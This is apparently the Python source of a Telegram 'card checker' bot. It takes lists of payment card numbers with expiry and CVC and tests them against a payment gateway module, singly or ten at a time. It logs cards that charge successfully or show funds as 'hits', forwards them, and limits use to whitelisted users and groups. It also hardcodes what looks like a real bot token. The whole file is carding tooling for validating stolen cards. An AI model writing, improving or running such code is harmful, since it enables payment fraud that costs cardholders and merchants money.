import time
import os
import threading
print("✅ Step 1: Libraries Imported")

try:
    from telebot import TeleBot, types
    from gatet import Tele
    from hit_sender import send
    print("✅ Step 2: Modules Loaded")
except ImportError as e:
    print(f"❌ Error Loading Modules: {e}")
    exit()

admin_name = "@Rusisvirus"

# ==========================================
# 👇 BOT TOKEN ကို ဒီနေရာမှာ တိုက်ရိုက်ထည့်ပါ
TOKEN = '8291993385:AAGlLkaG3V14Db9cwnYQpLeIJuJ5dxxIOZg'
# ==========================================

# ==========================================
# 👇 ၁. ခွင့်ပြုမယ့် GROUP ID များ
ALLOWED_GROUPS = [
    '-1003606197582', 
    '-1003606197582'
]

# 👇 ၂. ခွင့်ပြုမယ့် USER ID များ
ALLOWED_USERS = [
    '1915369904',      # Owner
    '6815134572',      # User 2
    'USER_ID_3_HERE',
    'USER_ID_4_HERE'
]
# ==========================================

print("✅ Step 3: Configuring Bot...")
bot = TeleBot(TOKEN, parse_mode="HTML")

# ⛔ Permission Function
def is_allowed(message):
    try:
        chat_type = message.chat.type
        chat_id = str(message.chat.id)
        user_id = str(message.from_user.id)

        if chat_type == 'private':
            if user_id not in ALLOWED_USERS:
                bot.reply_to(message, "❌ <b>Not Authorized!</b>", parse_mode="HTML")
                return False
        elif chat_type in ['group', 'supergroup']:
            if chat_id not in ALLOWED_GROUPS:
                bot.reply_to(message, "❌ <b>Group Not Authorized!</b>", parse_mode="HTML")
                return False
        return True
    except Exception as e:
        print(f"Permission Error: {e}")
        return False

@bot.message_handler(commands=["start"])
def start(message):
    if not is_allowed(message): return
    bot.reply_to(message, "✅ <b>Bot is Online!</b>\nUsage:\n/mt cc|mm|yy|cvc\n/mass (Bulk 10)", parse_mode="HTML")
    print(f"Command /start used by {message.from_user.id}")

@bot.message_handler(commands=['gfemin'])
def send_hits_file(message):
    if not is_allowed(message): return
    if os.path.exists("gfemin.txt"):
        with open("gfemin.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption="✅ <b>Hits File</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "No hits saved yet! ❌")

@bot.message_handler(commands=['mass'])
def mass_check(message):
    if not is_allowed(message): return
    t = threading.Thread(target=process_mass, args=(message,))
    t.start()

def process_mass(message):
    try:
        input_text = message.text.replace('/mass', '').strip()
        if not input_text:
            bot.reply_to(message, "⚠️ Paste cards after command!", parse_mode="HTML")
            return

        cards = [line.strip() for line in input_text.split('\n') if line.strip()]
        if len(cards) > 10: cards = cards[:10]

        msg = bot.reply_to(message, f"🔄 <b>Checking {len(cards)} cards...</b>", parse_mode="HTML")
        
        hits = 0
        username = message.from_user.username or "NoUsername"

        for cc in cards:
            try:
                last = str(Tele(cc))
                if "Payment Successful" in last or "funds" in last:
                    hits += 1
                    status = "Charged ✅" if "Payment Successful" in last else "Low Funds 🍃"
                    with open("gfemin.txt", "a") as f:
                        f.write(f"{cc} | {status}\n")
                    
                    try:
                        send_response = send(cc, last, username, 0)
                        bot.reply_to(message, send_response, parse_mode="HTML")
                    except: pass
            except Exception as e:
                print(f"Check Error: {e}")

        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text="✅ <b>Mass Check Done!</b>", parse_mode="HTML")

    except Exception as e:
        print(f"Mass Error: {e}")

@bot.message_handler(commands=['mt'])
def check_card(message):
    if not is_allowed(message): return
    try:
        cc = message.text.split('/mt', 1)[1].strip()
        msg = bot.reply_to(message, "Checking...")
        
        last = str(Tele(cc))
        print(f"Checked: {cc} -> {last}")

        if "Payment Successful" in last or "funds" in last:
             with open("gfemin.txt", "a") as f:
                f.write(f"{cc} | Hit/Fund\n")
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=f"Result: {last}")
    except Exception as e:
        print(f"Single Check Error: {e}")

print("✅ Step 4: Starting Polling Loop...")
try:
    bot.infinity_polling(timeout=25, long_polling_timeout=5)
except Exception as e:
    print(f"❌ Polling Error: {e}")
